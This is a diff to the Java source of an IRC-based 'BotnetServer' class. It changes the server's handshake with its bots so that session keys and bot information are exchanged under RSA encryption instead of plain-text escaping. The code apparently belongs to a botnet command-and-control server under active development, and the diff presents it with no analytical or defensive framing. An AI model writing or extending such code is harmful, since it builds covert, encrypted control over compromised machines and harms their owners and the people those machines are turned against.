@@ -91,7 +91,7 @@ public class BotnetServer extends PircBot {
 	 */
 	public BotnetServer() {
 		m = MsgEncrypt.getInstance();
-		m.genRSAPrivateKey(rsaMod + " " + rsaPrivateExp);
+		m.genRSAPrivKey(rsaMod + " " + rsaPrivateExp);
 		input = new Scanner(System.in);
 		try {
 			botKeys = new HashMap<String, MsgEncrypt>();
@@ -132,9 +132,10 @@ public class BotnetServer extends PircBot {
 						//use shellout for getting returned data from the client if you need it
 						//use chat.sendLine(s) to send key info
 						String key = m2.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::");
-						chat.sendLine(key); // send key
-						chat.sendLine(info.toString()); // send public info
-						String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n"); // get public key
+						chat.sendLine(m.encryptRSA(key)); // send key
+						chat.sendLine(m.encryptRSA(info.toString())); // send public info
+						String otherKey = m.decryptMsg(chat.readLine()); // get public key
+						//.replace("::", "\n").replace("-", "\r").replace("_", "\r\n")
 						//System.out.println("key: " + otherKey);
 						m2.handShake(otherKey);
 						botKeys.put(bots[i].getNick(), m2);
